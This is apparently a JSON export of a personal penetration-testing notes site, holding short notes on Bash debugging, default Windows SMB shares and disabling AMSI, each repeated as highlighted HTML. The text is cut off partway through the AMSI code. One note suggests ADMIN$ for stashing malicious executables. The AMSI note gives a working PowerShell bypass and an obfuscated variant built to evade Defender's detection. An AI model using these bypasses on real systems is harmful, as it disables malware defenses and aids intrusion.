style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[datetime:: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;datetime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[tags:: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;tags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[location:: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[weather:: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;text&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;],&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Debugging-Bash-scripts":{"slug":"spells/Debugging-Bash-scripts","filePath":"spells/Debugging Bash scripts.md","title":"Debugging Bash scripts","links":[],"tags":["Language/Bash"],"content":"Using the -x flag will force Bash to output each line of the shell script you’re running before that line is executed. This can be useful for debugging.\nbash -x ./script.sh\nThe -x flag can also be incorporated into the interpreter line.\n#!/usr/bin/env bash -x\n \n# Script content...\nFinally, this mode can be toggled on and off with the set command within the script itself.\n#!/usr/bin/env bash\n \n# Some script content...\n \nset -x\n \n# These lines will be echoed before execution.\n \nset +x\n \n# These lines will not be echoed...\nFrequently set -x is used at the start of a script without a closing set +x, which will just cause all lines of the script to be echoed back before execution.","richContent":"&lt;p&gt;Using the &lt;code&gt;-x&lt;/code&gt; flag will force Bash to output each line of the shell script you’re running before that line is executed. This can be useful for debugging.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ./script.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;-x&lt;/code&gt; flag can also be incorporated into the interpreter line.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/usr/bin/env bash -x&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Script content...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Finally, this mode can be toggled on and off with the &lt;code&gt;set&lt;/code&gt; command within the script itself.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/usr/bin/env bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Some script content...&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;set&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -x&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# These lines will be echoed before execution.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;set&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# These lines will not be echoed...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Frequently &lt;code&gt;set -x&lt;/code&gt; is used at the start of a script without a closing &lt;code&gt;set +x&lt;/code&gt;, which will just cause all lines of the script to be echoed back before execution.&lt;/p&gt;"},"spells/Default-CIFS-shares":{"slug":"spells/Default-CIFS-shares","filePath":"spells/Default CIFS shares.md","title":"Default CIFS shares","links":["spells/Exploit-Windows-services","spells/Exploit-Windows-tasks"],"tags":["Protocol/SMB","OS/Windows","AttackCycle/PrivEsc","AttackCycle/Exploitation"],"content":"Default SMB shares (which you generally can’t connect to):\n\nIPC$\nADMIN$\nC$\n\nThe ADMIN$ share is only accessibly by administrators; by default this maps to %WINDIR% (and is a great place to stash malicious executables for access via sc.exe or schtasks.exe, if you have the right permissions).","richContent":"&lt;p&gt;Default SMB shares (which you generally can’t connect to):&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;IPC$&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ADMIN$&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C$&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The &lt;code&gt;ADMIN$&lt;/code&gt; share is only accessibly by administrators; by default this maps to &lt;code&gt;%WINDIR%&lt;/code&gt; (and is a great place to stash malicious executables for access via &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-services&quot;&gt;sc.exe&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-tasks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-tasks&quot;&gt;schtasks.exe&lt;/a&gt;, if you have the right permissions).&lt;/p&gt;"},"spells/Disable-AMSI":{"slug":"spells/Disable-AMSI","filePath":"spells/Disable AMSI.md","title":"Disable AMSI","links":[],"tags":["HowTo","OS/Windows/AMSI","AttackCycle/AntiForensics","Application/PowerShell","OS/Windows/Defender"],"content":"Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of IEX for in-memory scripts!).\nOne bypass for this:\n[REF].Assembly.GetType(&#039;System.Management.Automation.AmsiUtils&#039;).GetField(&#039;amsiInitFailed&#039;,&#039;NonPublic,Static&#039;).SetValue($null,$true)\nNote that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.\n[REF].Assembly.GetType(&#039;System.Management.Automation.&#039;+$(&quot;41 6D 73 69 55 74 69 6C 73&quot;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),&#039;NonPublic,Static&#039;).SetValue($null,$true)\nBe aware that AMSI bypasses are per session, not global!","richContent":"&lt;p&gt;Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of IEX for in-memory scripts!).&lt;/p&gt;\n&lt;p&gt;One bypass for this:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;REF&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Assembly.GetType&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;System.Management.Automation.AmsiUtils&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.GetField&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;amsiInitFailed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;NonPublic,Static&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.SetValue&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;true&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. &lt;a href=&quot;https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;REF&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Assembly.GetType&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;System.Management.Automation.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;41 6D 73 69 55 74 69 6C 73&lt;/span&gt;&lt;span 